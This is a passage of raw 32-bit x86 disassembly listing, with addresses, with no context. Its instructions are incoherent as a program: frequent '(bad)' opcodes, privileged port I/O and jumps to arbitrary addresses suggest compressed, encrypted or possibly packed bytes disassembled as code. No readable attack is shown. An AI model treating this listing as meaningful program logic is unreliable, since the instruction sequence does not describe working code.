  40b173:	jne    0x40b158
  40b175:	mov    ch,0xa3
  40b177:	xor    ah,BYTE PTR [edx+edi*8+0x106bd35a]
  40b17e:	xchg   edx,eax
  40b17f:	data16 js 0x40b168
  40b182:	pusha  
  40b183:	in     al,dx
  40b184:	in     al,dx
  40b185:	fs std 
  40b187:	jl     0x40b1f7
  40b189:	push   esi
  40b18a:	adc    DWORD PTR [esi],esi
  40b18c:	push   0x3b28bdff
  40b191:	mov    dh,0xae
  40b193:	mov    ebp,0xcf349193
  40b198:	adc    DWORD PTR [edi],edx
  40b19a:	xor    BYTE PTR [ebx+0x2a],0xa1
  40b19e:	enter  0xac44,0x66
  40b1a2:	inc    ebp
  40b1a3:	dec    ebx
  40b1a4:	xor    edi,esi
  40b1a6:	push   ebp
  40b1a7:	test   BYTE PTR [edx-0x7704f425],0x82
  40b1ae:	pop    ecx
  40b1af:	mov    ecx,eax
  40b1b1:	jecxz  0x40b156
  40b1b3:	or     dl,BYTE PTR [eax+ecx*1]
  40b1b6:	xor    eax,0x26b5d31a
  40b1bb:	and    ch,bl
  40b1bd:	jnp    0x40b19b
  40b1bf:	sbb    edx,DWORD PTR [esi]
  40b1c1:	add    esp,ebp
  40b1c3:	cli    
  40b1c4:	or     eax,0xff6d4621
  40b1c9:	gs jb  0x40b1bc
  40b1cc:	fs ja  0x40b1c8
  40b1cf:	aad    0x9c
  40b1d1:	xchg   ecx,eax
  40b1d2:	pop    ebp
  40b1d3:	arpl   WORD PTR [ecx+0x5287a43f],bp
  40b1d9:	jp     0x40b224
  40b1db:	cmp    eax,0x1eb046af
  40b1e0:	sbb    eax,0x7e402d1e
  40b1e5:	jnp    0x40b1a9
  40b1e7:	aam    0xb2
  40b1e9:	mov    eax,0xecee5558
  40b1ee:	inc    edi
  40b1ef:	loopne 0x40b207
  40b1f1:	jae    0x40b241
  40b1f3:	adc    DWORD PTR [ebx+0x55],ecx
  40b1f6:	pusha  
  40b1f7:	jae    0x40b1e0
  40b1f9:	jnp    0x40b1ee
  40b1fb:	push   esp
  40b1fc:	mul    ebx
  40b1fe:	xchg   esi,eax
  40b1ff:	sbb    al,0xa5
  40b201:	lods   al,BYTE PTR ds:[esi]
  40b202:	ins    BYTE PTR es:[edi],dx
  40b203:	data16 cmp al,0x9d
  40b206:	scas   eax,DWORD PTR es:[edi]
  40b207:	sbb    al,ch
  40b209:	or     dh,bh
  40b20b:	sbb    BYTE PTR [ebx+0x50c8f6f0],cl
  40b211:	pop    esp
  40b212:	test   al,0xde
  40b214:	ret    
  40b215:	rcl    BYTE PTR [edi],cl
  40b217:	and    al,0xae
  40b219:	mov    ecx,eax
  40b21b:	cdq    
  40b21c:	daa    
  40b21d:	and    bl,BYTE PTR [eax+0x63fb13ef]
  40b223:	mov    BYTE PTR [esp+esi*2-0x2a],dl
  40b227:	test   DWORD PTR [ecx+0x30],edi
  40b22a:	dec    ebp
  40b22b:	mov    dh,0x51
  40b22d:	jmp    0x309b5fe4
  40b232:	adc    al,0x8d
  40b234:	dec    edi
  40b235:	xchg   DWORD PTR [ecx],ecx
  40b237:	mov    BYTE PTR [ecx],bh
  40b239:	mov    al,ds:0x9d4f2aa8
  40b23e:	fistp  QWORD PTR [eax]
  40b240:	inc    esi
  40b241:	push   edx
  40b242:	mov    dl,0x4e
  40b244:	test   ah,bh
  40b246:	push   esi
  40b247:	inc    eax
  40b248:	jne    0x40b261
  40b24a:	stos   DWORD PTR es:[edi],eax
  40b24b:	pop    edi
  40b24c:	call   DWORD PTR [edi+0x52]
  40b24f:	or     BYTE PTR [ebp+0x65],ch
  40b252:	mov    al,ds:0x79341a53
  40b257:	and    al,0x8
  40b259:	test   esi,0xa3c557f4
  40b25f:	or     ecx,esp
  40b261:	hlt    
  40b262:	fistp  QWORD PTR [ebp+0x158817f0]
  40b268:	mov    ds:0x25b8575c,eax
  40b26d:	push   0x7b19f7ac
  40b272:	jo     0x40b204
  40b274:	fisub  DWORD PTR [ebx+0x48]
  40b277:	popf   
  40b278:	(bad)  
  40b27a:	ja     0x40b209
  40b27c:	xor    eax,0x26b2fd72
  40b281:	sbb    BYTE PTR [ecx],cl
  40b283:	or     bl,BYTE PTR [ecx]
  40b285:	mov    edi,0x2bd52dc7
  40b28a:	sub    BYTE PTR [eax+ebx*2+0x64],0x2e
  40b28f:	pushf  
  40b290:	ret    0xed0a
  40b293:	jle    0x40b21d
  40b295:	inc    esp
  40b296:	pop    eax
  40b297:	bound  edx,QWORD PTR [ebp-0x44817186]
  40b29d:	pop    ss
  40b29e:	lahf   
  40b29f:	xchg   DWORD PTR [edx],edx
  40b2a1:	loope  0x40b316
  40b2a3:	fidivr DWORD PTR [edx+esi*4+0x11fe337c]
  40b2aa:	jp     0x40b2d3
  40b2ac:	fnsave [esi]
  40b2ae:	and    al,BYTE PTR [esi-0x30e3783d]
  40b2b4:	sub    eax,0x113a34a5
  40b2b9:	int    0x6b
  40b2bb:	test   DWORD PTR [ebx],ecx
  40b2bd:	shl    DWORD PTR [edi],0x44
  40b2c0:	aad    0xc0
  40b2c2:	loop   0x40b25e
  40b2c4:	ss retf 
  40b2c6:	int    0x36
  40b2c8:	(bad)  
  40b2ca:	js     0x40b2f9
  40b2cc:	les    ebp,FWORD PTR [ebx]
  40b2ce:	stos   BYTE PTR es:[edi],al
  40b2cf:	out    0x84,eax
  40b2d1:	stos   BYTE PTR es:[edi],al
  40b2d2:	sbb    eax,0xf8f0ef6d
  40b2d7:	mov    ecx,0x58422779
  40b2dc:	test   BYTE PTR [edi-0x6f],dh
  40b2df:	push   ss
  40b2e0:	or     DWORD PTR [ecx+0x2897ec09],ebp
  40b2e6:	push   0xffffffff
  40b2e8:	xchg   BYTE PTR [esi+0x1e3f17ad],bl
  40b2ee:	sub    BYTE PTR [eax-0xb],dh
  40b2f1:	xchg   edx,eax
  40b2f2:	pop    esp
  40b2f3:	jp     0x40b35e
  40b2f5:	mov    ebx,0x6ea334e3
  40b2fa:	mov    WORD PTR [edx],ss
  40b2fc:	add    DWORD PTR ds:0x3bef21ac,edx
  40b302:	daa    
  40b303:	fld    QWORD PTR [esi-0x4491d597]
  40b309:	cmp    eax,0x41985028
  40b30e:	mov    eax,0xad035807
  40b313:	icebp  
  40b314:	scas   al,BYTE PTR es:[edi]
  40b315:	xchg   DWORD PTR [ebx-0x470a6f74],edx
  40b31b:	mov    esp,0xfd173d64
  40b320:	dec    edi
  40b321:	daa    
  40b322:	dec    ecx
  40b323:	mov    al,ds:0x77b1b830
  40b328:	stos   DWORD PTR es:[edi],eax
  40b329:	lahf   
  40b32a:	adc    BYTE PTR [edi+0x1faaf0c3],0x7f
  40b331:	shl    BYTE PTR [ecx-0x72],cl
  40b334:	and    edx,ecx
  40b336:	mov    fs,eax
  40b338:	mov    esi,0xe2d85c74
  40b33d:	jo     0x40b391
  40b33f:	mov    eax,ds:0xcb393b23
  40b344:	lock xchg esi,eax
  40b346:	ins    BYTE PTR es:[edi],dx
  40b347:	push   0x805244b0
  40b34c:	mov    bl,BYTE PTR [edx]
  40b34e:	push   ebx
  40b34f:	mov    esp,esi
  40b351:	inc    edx
  40b352:	pop    ds
  40b353:	sti    
  40b354:	xor    BYTE PTR [edi+0x7558cbf9],0x6c
  40b35b:	jnp    0x40b3ae
  40b35d:	sub    dh,BYTE PTR [edi]
  40b35f:	mov    al,ds:0x866dc3ba
  40b364:	cli    
  40b365:	inc    ebx
  40b366:	scas   al,BYTE PTR es:[edi]
  40b367:	frstor [ebp-0x4da331c0]
  40b36d:	mov    al,ds:0x15c2ed36
  40b372:	je     0x40b306
  40b374:	popf   
  40b375:	call   FWORD PTR ds:0x6f073bf3
  40b37b:	mov    al,0xf1
  40b37d:	add    al,0xaf
  40b37f:	cli    
  40b380:	pslld  mm0,mm1
  40b383:	push   ds
  40b384:	int    0x8d
  40b386:	in     al,0x5f
  40b388:	dec    dl
  40b38a:	push   edi
  40b38b:	xor    BYTE PTR [edx],bh
  40b38d:	scas   eax,DWORD PTR es:[edi]
  40b38e:	mov    al,ds:0x57572d5b
  40b393:	hlt    
  40b394:	or     ebp,0xffffffe0
  40b397:	fbld   TBYTE PTR [ebp-0x12]
  40b39a:	pop    ecx
  40b39b:	ja     0x40b345
  40b39d:	sub    DWORD PTR [eax+0x51812047],edi
  40b3a3:	or     al,0x1c
  40b3a5:	adc    eax,0xce898279
  40b3aa:	add    esp,DWORD PTR ds:0x9352e487
  40b3b0:	sub    edx,edx
  40b3b2:	sbb    DWORD PTR [esi],ebx
  40b3b4:	push   ecx
  40b3b5:	xchg   BYTE PTR [eax],bl
  40b3b7:	sub    ebx,edx
  40b3b9:	fsub   st(4),st
  40b3bb:	test   DWORD PTR [eax-0x69],eax
  40b3be:	scas   al,BYTE PTR es:[edi]
  40b3bf:	popa   
  40b3c0:	jns    0x40b3e8
  40b3c2:	jae    0x40b3ec
  40b3c4:	mov    BYTE PTR [ebx+0x1e],cl
  40b3c7:	push   esi
  40b3c8:	jl     0x40b41d
  40b3ca:	ds inc esp
  40b3cc:	lods   eax,DWORD PTR ds:[esi]
  40b3cd:	sbb    ebx,DWORD PTR es:[eax-0x64]
  40b3d1:	aaa    
  40b3d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d3:	lods   al,BYTE PTR ds:[esi]
  40b3d4:	xor    BYTE PTR [ebx],bh
  40b3d6:	inc    ecx
  40b3d7:	mov    cl,0x5a
  40b3d9:	jge    0x40b411
  40b3db:	sub    DWORD PTR [edx+0x58],eax
  40b3de:	or     eax,0xb1c51e31
  40b3e3:	xchg   esi,eax
  40b3e4:	jbe    0x40b42f
  40b3e6:	sbb    eax,0x5d0e2cb5
  40b3eb:	xor    ax,0x8725
  40b3ef:	fisubr WORD PTR [ebx]
  40b3f1:	mov    bh,0xe8
  40b3f3:	inc    ecx
  40b3f4:	and    eax,DWORD PTR [ecx+eax*8+0x5a95be89]
  40b3fb:	es pusha 
  40b3fd:	ss jae 0x40b3d5
  40b400:	in     al,dx
  40b401:	mov    bl,0x10
  40b403:	sub    edi,edx
  40b405:	mov    ebx,0x9bede1a9
  40b40a:	fild   DWORD PTR [edx+eax*8-0x7e]
  40b40e:	or     edx,DWORD PTR [ebp+0x2b]
  40b411:	ja     0x40b3f2
  40b413:	mov    cl,0xe1
  40b415:	mov    eax,ds:0x3680b82c
  40b41a:	jecxz  0x40b3b8
  40b41c:	inc    edi
  40b41d:	push   es
  40b41e:	inc    eax
  40b41f:	push   es
  40b420:	cmp    ebx,ebp
  40b422:	xchg   ebp,eax
  40b423:	xchg   BYTE PTR [edi+0x47],dl
  40b426:	and    edx,DWORD PTR [ecx+0x225b7354]
  40b42c:	mov    ch,0xdc
  40b42e:	mov    esi,0x651bad6d
  40b433:	inc    edx
  40b434:	and    BYTE PTR [esi],dl
  40b436:	cld    
  40b437:	push   ss
  40b438:	mov    ss,ebx
  40b43a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b43b:	fdivr  st,st(3)
  40b43d:	fist   WORD PTR [edx+0x63]
  40b440:	lods   eax,DWORD PTR ds:[esi]
  40b441:	dec    edi
  40b442:	jns    0x40b44b
  40b444:	mov    cl,0x1d
  40b446:	lods   eax,DWORD PTR ds:[esi]
  40b447:	adc    al,0x4f
  40b449:	fdivr  st,st(2)
  40b44b:	jmp    0x40b49a
  40b44d:	fs push 0xffffff8d
  40b450:	add    al,0x90
  40b452:	dec    edx
  40b453:	pop    edx
  40b454:	call   0xab2b:0xd8bc34d
  40b45b:	jg     0x40b45c
  40b45d:	popa   
  40b45e:	sbb    al,0x34
  40b460:	jno    0x40b4d0
  40b462:	mov    ecx,0xee8ac122
  40b467:	mov    cl,0xc1
  40b469:	call   0xa92d:0x2710558c
  40b470:	cs dec edi
  40b472:	popa   
  40b473:	dec    edx
  40b474:	out    0x50,al
  40b476:	mov    dl,bl
  40b478:	inc    eax
  40b479:	adc    bh,BYTE PTR [ecx-0xc]
  40b47c:	out    0xa6,al
  40b47e:	pop    eax
  40b47f:	cmc    
  40b480:	inc    eax
  40b481:	retf   
  40b482:	adc    al,0xc0
  40b484:	xchg   ebx,eax
  40b485:	pop    ebp
  40b486:	xor    al,0xdf
  40b488:	idiv   BYTE PTR [eax]
  40b48a:	lahf   
  40b48b:	mov    edx,0xf81627e3
  40b490:	push   ecx
  40b491:	popa   
  40b492:	inc    edx
  40b493:	cmp    DWORD PTR [ebx-0x2cc7eeba],ebp
  40b499:	(bad)  
  40b49a:	mul    BYTE PTR ds:0x34a9006c
  40b4a0:	js     0x40b42d
  40b4a2:	push   eax
  40b4a3:	xor    eax,0x6e6d415c
  40b4a8:	jb     0x40b478
  40b4aa:	cmp    ah,cl
  40b4ac:	pop    edi
  40b4ad:	mov    eax,ds:0xdf28cbae
  40b4b2:	xchg   ecx,esp
  40b4b4:	rep lods al,BYTE PTR ds:[esi]
  40b4b6:	bound  edi,QWORD PTR [edx-0x26]
  40b4b9:	(bad)  
  40b4bb:	mov    eax,0xde1ecd42
  40b4c0:	fucomp st(4)
  40b4c2:	ja     0x40b4bd
  40b4c4:	jno    0x40b49e
  40b4c6:	jecxz  0x40b48e
  40b4c8:	cdq    
  40b4c9:	fstp   DWORD PTR [esi]
  40b4cb:	sbb    al,0xd0
  40b4cd:	pop    es
  40b4ce:	add    esp,esp
  40b4d0:	mov    eax,ds:0xe79831f1
  40b4d5:	or     DWORD PTR [ecx-0x78],esp
  40b4d8:	mov    edi,DWORD PTR [ebx-0x38091f41]
  40b4de:	fld    DWORD PTR [edx+0x41281e52]
  40b4e4:	jne    0x40b47c
  40b4e6:	daa    
  40b4e7:	pop    ebx
  40b4e8:	mov    dl,0x2f
  40b4ea:	repnz mov ecx,0x677bbd1a
  40b4f0:	pusha  
  40b4f1:	dec    eax
  40b4f2:	repz mov eax,0xbe2342b8
  40b4f8:	out    dx,al
  40b4f9:	adc    al,0x6c
  40b4fb:	lds    edi,FWORD PTR [ebp-0x7ef9d3f6]
  40b501:	adc    al,0xa5
  40b503:	pop    eax
  40b504:	and    DWORD PTR [eax],ebp
  40b506:	mov    ebp,0x356bd8fc
  40b50b:	push   edx
  40b50c:	int    0x5d
  40b50e:	dec    ebp
  40b50f:	mov    eax,0x83cd8664
  40b514:	sub    BYTE PTR [ebx-0x73cf3a76],ah
  40b51a:	pusha  
  40b51b:	xchg   esi,eax
  40b51c:	in     eax,dx
  40b51d:	ds inc ebx
  40b51f:	cmp    al,BYTE PTR [eax+esi*4]
  40b522:	sub    DWORD PTR [edx+0x3c1e06ee],ebx
  40b528:	das    
  40b529:	outs   dx,DWORD PTR ds:[esi]
  40b52a:	sub    ebx,DWORD PTR [edi-0x67]
  40b52d:	mov    cl,0xf5
  40b52f:	cmc    
  40b530:	and    edx,ecx
  40b532:	(bad)  
  40b534:	out    0xe6,eax
  40b536:	jb     0x40b4da
  40b538:	xor    DWORD PTR ds:[edx+ecx*1],0xa86320e3
  40b540:	shl    BYTE PTR [esi+0x52],1
  40b543:	mov    dh,0xe9
  40b545:	or     esi,ebp
  40b547:	into   
  40b548:	das    
  40b549:	inc    edx
  40b54a:	lds    ebx,FWORD PTR [edx]
  40b54c:	retf   
  40b54d:	cld    
  40b54e:	adc    esi,ebx
  40b550:	addr16 add ebp,0xb6f1dc1c
  40b557:	mov    bl,0x35
  40b559:	stc    
  40b55a:	ss loop 0x40b4e2
  40b55d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b55f:	fmul   DWORD PTR [edi-0x1c60806d]
  40b565:	imul   ebx,DWORD PTR [eax+0x3c],0x13
  40b569:	cmp    eax,0x13285f1b
  40b56e:	xchg   edx,eax
  40b56f:	icebp  
  40b570:	aam    0x63
  40b572:	fistp  QWORD PTR [edi+0x301bf9]
  40b578:	repnz xchg ebp,eax
  40b57a:	sbb    eax,0x833c6ed9
  40b57f:	jecxz  0x40b5f3
  40b581:	icebp  
  40b582:	sbb    edi,eax
  40b584:	lods   eax,DWORD PTR ds:[esi]
  40b585:	in     eax,0xe8
  40b587:	sbb    al,dh
  40b589:	adc    eax,0x85c9f25d
  40b58e:	shl    BYTE PTR [esi+0x3ce753e4],cl
  40b594:	out    dx,al
  40b595:	pusha  
  40b596:	add    eax,0x6180f3d
  40b59b:	retf   0xa21d
  40b59e:	or     eax,DWORD PTR [ecx+esi*4+0x39]
  40b5a2:	jp     0x40b577
  40b5a4:	sub    al,0x7
  40b5a6:	fadd   DWORD PTR [edx-0x68624c04]
  40b5ac:	in     al,dx
  40b5ad:	lods   al,BYTE PTR ds:[esi]
  40b5ae:	ret    0x3141
  40b5b1:	(bad)  
  40b5b2:	(bad)  
  40b5b3:	or     BYTE PTR ds:0x7b3f7d6c,cl
  40b5b9:	ja     0x40b58b
  40b5bb:	pop    ss
  40b5bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5bd:	gs jg  0x40b57e
  40b5c0:	inc    esp
  40b5c1:	and    DWORD PTR ds:0x3559cafd,esp
  40b5c7:	xlat   BYTE PTR ds:[ebx]
  40b5c8:	jle    0x40b60c
  40b5ca:	adc    al,0x83
  40b5cc:	iret   
  40b5cd:	into   
  40b5ce:	fld    st(5)
  40b5d0:	int3   
  40b5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d2:	dec    eax
  40b5d3:	dec    ecx
  40b5d4:	das    
  40b5d5:	je     0x40b643
  40b5d7:	jmp    0x330334f1
  40b5dc:	(bad)  [edi+0x35]
  40b5df:	or     BYTE PTR [edi],dh
  40b5e1:	and    al,0x83
  40b5e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5e4:	cmp    BYTE PTR [edi],bh
  40b5e6:	jge    0x40b61f
  40b5e8:	add    ecx,DWORD PTR [eax+0x22]
  40b5eb:	les    ebp,FWORD PTR [edi-0x7c8d2348]
  40b5f1:	xchg   esi,eax
  40b5f2:	aam    0x43
  40b5f4:	outs   dx,BYTE PTR ds:[esi]
  40b5f5:	xchg   ecx,eax
  40b5f6:	cmp    ebx,edx
  40b5f8:	sub    bl,BYTE PTR [esi+0x3ca6ec94]
  40b5fe:	cmp    ebp,DWORD PTR [eax+edi*2-0x605a251b]
  40b605:	ds loop 0x40b637
  40b608:	mov    bl,0x9
  40b60a:	push   ebx
  40b60b:	and    DWORD PTR [eax+0x14],ebp
  40b60e:	xchg   edx,eax
  40b60f:	aad    0xd9
  40b611:	rol    DWORD PTR [ebp-0x4c],0x88
  40b615:	mov    esp,0x5193226
  40b61a:	mov    edi,DWORD PTR [esi+0x6f]
  40b61d:	mov    ebp,0xdcd1da63
  40b622:	mov    esi,0x4970ad39
  40b627:	mov    ah,0x4d
  40b629:	out    dx,eax
  40b62a:	adc    eax,DWORD PTR [ebx-0x71614ca8]
  40b630:	ds fwait
  40b632:	cmp    DWORD PTR [eax+esi*1+0x4716455d],ebx
  40b639:	mov    BYTE PTR [esi+0x3f],ch
  40b63c:	test   DWORD PTR [edx],0xc2300362
  40b642:	sbb    BYTE PTR [ebp+0x47],0x23
  40b646:	mov    ebx,0xa1d051dd
  40b64b:	cmp    dh,cl
  40b64d:	in     eax,dx
  40b64e:	pop    ds
  40b64f:	pusha  
  40b650:	xchg   BYTE PTR [ebp+0x4071cb1a],dh
  40b656:	les    ebx,FWORD PTR [ecx]
  40b658:	(bad)  
  40b659:	idiv   BYTE PTR [ecx+0x37]
  40b65c:	add    dh,al
  40b65e:	pop    ecx
  40b65f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b660:	jmp    0xc091e1b
  40b665:	fwait
  40b666:	shl    dl,1
  40b668:	das    
  40b669:	fcomp  DWORD PTR [eax+edi*8+0x181429ef]
  40b670:	aam    0x9a
  40b672:	arpl   WORD PTR [eax-0x35],bx
  40b675:	xor    bh,dh
  40b677:	nop
  40b678:	inc    esp
  40b679:	xlat   BYTE PTR ds:[ebx]
  40b67a:	sbb    ah,dl
  40b67c:	mov    dh,0x23
  40b67e:	(bad)  
  40b67f:	aam    0xb4
  40b681:	xor    DWORD PTR [ebp+0x6eee94f3],esp
  40b687:	aas    
  40b688:	cmp    al,BYTE PTR [edx]
  40b68a:	ret    
  40b68b:	sub    BYTE PTR [ecx],bh
  40b68d:	popf   
  40b68e:	sti    
  40b68f:	scas   eax,DWORD PTR es:[edi]
  40b690:	mov    ss,esi
  40b692:	inc    esi
  40b693:	push   ds
  40b694:	rcl    dl,cl
  40b696:	sti    
  40b697:	jns    0x40b6dd
  40b699:	pop    ss
  40b69a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b69b:	pushf  
  40b69c:	pop    edx
  40b69d:	adc    ah,BYTE PTR [ebp-0x69]
  40b6a0:	push   esi
  40b6a1:	(bad)  
  40b6a2:	std    
  40b6a3:	or     DWORD PTR [esi+0x31454df7],ebp
  40b6a9:	js     0x40b65e
  40b6ab:	push   ss
  40b6ac:	call   0xf62c:0xb347e661
  40b6b3:	(bad)  
  40b6b5:	mov    al,ds:0x28b7953f
  40b6ba:	rol    edi,0x63
  40b6bd:	retf   0x94b6
  40b6c0:	fild   QWORD PTR [esi-0x39e59cbe]
  40b6c6:	mov    cl,BYTE PTR [edi+0x47f403dc]
  40b6cc:	lds    esp,FWORD PTR [ecx+0x3fd891b2]
  40b6d2:	dec    edx
  40b6d3:	cmp    DWORD PTR [eax+eax*4],esi
  40b6d6:	push   esi
  40b6d7:	dec    edi
  40b6d8:	pop    esi
  40b6d9:	(bad)  
  40b6da:	into   
  40b6db:	cwde   
  40b6dc:	dec    ebp
  40b6dd:	and    al,0xa
  40b6df:	retf   0xca27
  40b6e2:	adc    eax,esp
  40b6e4:	push   ebx
  40b6e5:	nop
  40b6e6:	push   ebp
  40b6e7:	dec    ebp
  40b6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e9:	in     eax,0x4f
  40b6eb:	sbb    BYTE PTR [eax],dl
  40b6ed:	pop    ecx
  40b6ee:	aam    0x46
  40b6f0:	nop
  40b6f1:	xchg   esp,eax
  40b6f2:	push   eax
  40b6f3:	cmp    ecx,edi
  40b6f5:	pop    ebp
  40b6f6:	add    DWORD PTR [esi],eax
  40b6f8:	int    0x7d
  40b6fa:	jbe    0x40b6b4
  40b6fc:	add    eax,0x91b77985
  40b701:	mov    BYTE PTR [esp+ecx*2-0x1d8e9acd],0x21
  40b709:	add    BYTE PTR [ebx],dl
  40b70b:	cld    
  40b70c:	dec    ebx
  40b70d:	mov    esi,0x475dec43
  40b712:	sub    edx,DWORD PTR [ebp-0x52c8030b]
  40b718:	mov    edi,0x441c0349
  40b71d:	inc    ecx
  40b71e:	mov    esi,0xbefb456d
  40b723:	jns    0x40b6ee
  40b725:	into   
  40b726:	jp     0x40b7a1
  40b728:	sub    ebx,ecx
  40b72a:	das    
  40b72b:	xlat   BYTE PTR ds:[ebx]
  40b72c:	dec    esi
  40b72d:	cmp    BYTE PTR [esi],ch
  40b72f:	cmp    bl,BYTE PTR [edx-0x64]
  40b732:	xchg   ebx,eax
  40b733:	ins    BYTE PTR es:[edi],dx
  40b734:	pop    ebx
  40b735:	and    ebx,DWORD PTR [edi]
  40b737:	dec    ebx
  40b738:	push   0xffffffe1
  40b73a:	stos   BYTE PTR es:[edi],al
  40b73b:	arpl   dx,di
  40b73d:	or     al,0x26
  40b73f:	push   ecx
  40b740:	fwait
  40b741:	jg     0x40b726
  40b743:	sbb    eax,0x9ce929c2
  40b748:	inc    ax
  40b74a:	bound  ebx,QWORD PTR [edx+0x24124538]
  40b750:	repnz lods al,BYTE PTR ds:[esi]
  40b752:	and    dh,bl
  40b754:	push   0xfffffffa
  40b756:	dec    ecx
  40b757:	add    BYTE PTR [ecx],ch
  40b759:	hlt    
  40b75a:	(bad)  
  40b75b:	push   cs
  40b75c:	outs   dx,BYTE PTR ds:[esi]
  40b75d:	popf   
  40b75e:	xor    al,0x2a
  40b760:	addr16 dec ecx
  40b762:	mov    eax,ds:0x2693d988
  40b767:	div    BYTE PTR [ecx+edi*4-0x64]
  40b76b:	pop    ds
  40b76c:	jo     0x40b7df
  40b76e:	sti    
  40b76f:	sbb    DWORD PTR [edi+ecx*2-0x1a0dfc63],edi
  40b776:	inc    edx
  40b777:	pop    ebp
  40b778:	dec    ebp
  40b779:	pushf  
  40b77a:	push   0xb9892790
  40b77f:	cmp    DWORD PTR [edx],ebx
  40b781:	xlat   BYTE PTR ds:[ebx]
  40b782:	lds    edx,FWORD PTR [eax-0x12892627]
  40b788:	or     DWORD PTR [edx-0x2518a30a],eax
  40b78e:	cld    
  40b78f:	or     DWORD PTR [esp+eax*4],ebp
  40b792:	sar    BYTE PTR [esi+0x4f97f869],1
  40b798:	mov    cl,0xa5
  40b79a:	pop    edx
  40b79b:	push   DWORD PTR [edi+0x51a0a838]
  40b7a1:	pop    ebx
  40b7a2:	mov    ss,WORD PTR [edi+eiz*2-0x7c570313]
  40b7a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7aa:	and    eax,DWORD PTR [ebx]
  40b7ac:	icebp  
  40b7ad:	je     0x40b7ae
  40b7af:	sbb    eax,0xf072feda
  40b7b4:	das    
  40b7b5:	mov    ds:0xbf1c81da,eax
  40b7ba:	xor    al,0x25
  40b7bc:	dec    eax
  40b7bd:	sbb    bh,BYTE PTR [ebp+0x24eb7e7]
  40b7c3:	adc    edi,DWORD PTR [edx]
  40b7c5:	cmp    DWORD PTR [ecx-0x6b8bb161],0xffffff9a
  40b7cc:	push   eax
  40b7ce:	pop    ebx
  40b7cf:	fst    QWORD PTR [esi]
  40b7d1:	pop    ss
  40b7d2:	push   ds
  40b7d3:	popf   
  40b7d4:	jne    0x40b84e
  40b7d6:	retf   0x5994
  40b7d9:	in     al,0x8f
  40b7db:	hlt    
  40b7dc:	jg     0x40b797
  40b7de:	test   BYTE PTR [edi-0x732a005b],dl
  40b7e4:	push   esi
  40b7e5:	push   ebx
  40b7e6:	xchg   esp,eax
  40b7e7:	out    dx,al
  40b7e8:	xchg   ebp,eax
  40b7e9:	add    al,BYTE PTR [eax-0x294693e6]
  40b7ef:	and    esp,DWORD PTR [esi-0x6d]
  40b7f2:	mov    DWORD PTR [edi-0x24],esi
  40b7f5:	fwait
  40b7f6:	iret   
  40b7f7:	leave  
  40b7f8:	pop    ebx
  40b7f9:	push   es
  40b7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7fb:	jmp    0x40b855
  40b7fd:	in     al,dx
  40b7fe:	push   esp
  40b7ff:	cdq    
  40b800:	lods   al,BYTE PTR ds:[esi]
  40b801:	loopne 0x40b82b
  40b803:	rcl    BYTE PTR [eax+edi*2+0x53],cl
  40b807:	test   eax,0x63c11591
  40b80c:	adc    ecx,DWORD PTR [ebx-0x21]
  40b80f:	outs   dx,DWORD PTR ds:[esi]
  40b810:	daa    
  40b811:	mov    BYTE PTR [esp+ecx*4+0x8],ah
  40b815:	rcr    ch,0x3e
  40b818:	adc    eax,0x4e9e8724
  40b81d:	dec    edx
  40b81e:	dec    ecx
  40b81f:	pusha  
  40b820:	lahf   
  40b821:	jmp    0x40b7b9
  40b823:	push   ecx
  40b824:	xor    al,0x3d
  40b826:	test   BYTE PTR [ecx-0x5d598a42],ah
  40b82c:	arpl   WORD PTR [ecx-0x6442b01],sp
  40b832:	push   edx
  40b833:	fmul   DWORD PTR [ebx-0x7175387c]
  40b839:	jg     0x40b7ce
  40b83b:	icebp  
  40b83c:	mov    al,ds:0x6fc58cf6
  40b841:	inc    esp
  40b842:	xor    BYTE PTR [eax],dl
  40b844:	ins    BYTE PTR es:[edi],dx
  40b845:	clc    
  40b846:	or     DWORD PTR [ebp+0x5f],edi
  40b849:	out    dx,eax
  40b84a:	mov    ecx,0xc49247f9
  40b84f:	pop    edi
  40b850:	(bad)  
  40b852:	lds    ebp,FWORD PTR [esi+edi*1-0x4f]
  40b856:	popa   
  40b857:	cmp    edx,ebp
  40b859:	pop    esi
  40b85a:	int3   
  40b85b:	in     eax,0x6e
  40b85d:	cmp    bl,ah
  40b85f:	adc    esi,DWORD PTR [ecx-0x13]
  40b862:	ret    
  40b863:	or     ebp,DWORD PTR [ebp+0x28]
  40b866:	out    0x2c,al
  40b868:	in     al,dx
  40b869:	push   ss
  40b86a:	adc    eax,0x6c3e4bd1
  40b86f:	loopne 0x40b8d3
  40b871:	loope  0x40b86f
  40b873:	shr    DWORD PTR [edi],1
  40b875:	iret   
  40b876:	cdq    
  40b877:	jmp    0xea90379d
  40b87c:	push   ebx
  40b87d:	adc    al,BYTE PTR [ecx]
  40b87f:	(bad)  
  40b881:	rol    BYTE PTR [edi],cl
  40b883:	imul   ebp,edi,0xa37a9bc6
  40b889:	stos   BYTE PTR es:[edi],al
  40b88a:	outs   dx,BYTE PTR ds:[esi]
  40b88b:	cld    
  40b88c:	das    
  40b88d:	setp   BYTE PTR [eax-0xe]
  40b891:	in     eax,0x5d
  40b893:	jle    0x40b912
  40b895:	stos   BYTE PTR es:[edi],al
  40b896:	inc    ebx
  40b897:	or     ebx,DWORD PTR [esi-0x6e]
  40b89a:	mov    esi,0xa7ab118d
  40b89f:	inc    ebp
  40b8a0:	daa    
  40b8a1:	jno    0x40b903
  40b8a3:	pop    ecx
  40b8a4:	sti    
  40b8a5:	dec    esi
  40b8a6:	inc    ebx
  40b8a7:	or     eax,edi
  40b8a9:	les    esp,FWORD PTR [ebx-0x45]
  40b8ac:	and    BYTE PTR [edx+0x573e2cdc],al
  40b8b2:	xor    ebx,DWORD PTR [ebx+0xd]
  40b8b5:	aas    
  40b8b6:	cmp    BYTE PTR [edi+ecx*1-0x44640670],ch
